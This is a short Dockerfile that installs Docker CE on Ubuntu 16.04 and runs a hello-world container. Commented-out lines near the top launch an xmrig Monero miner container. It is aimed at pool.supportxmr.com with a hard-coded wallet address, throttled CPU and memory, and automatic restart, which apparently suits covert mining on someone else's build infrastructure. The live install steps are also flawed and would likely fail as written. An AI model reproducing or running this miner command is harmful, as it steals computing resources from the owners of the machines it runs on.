FROM ubuntu:16.04
#RUN apt-get update -y && apt-get upgrade  -y && \
#    apt install  -y  docker.io && \
#    service docker start
#RUN  dockerd
#RUN docker run -cap-add=NET_ADMIN --restart unless-stopped --read-only --cpus=".1" -m 50M -c 512 bitnn/alpine-xmrig -o pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x -k 

RUN apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common
RUN curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
RUN  apt-key fingerprint 0EBFCD88
RUN add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) stable"
   
RUN apt-get update
RUN apt-get install docker-ce docker-ce-cli containerd.io

RUN docker run hello-world
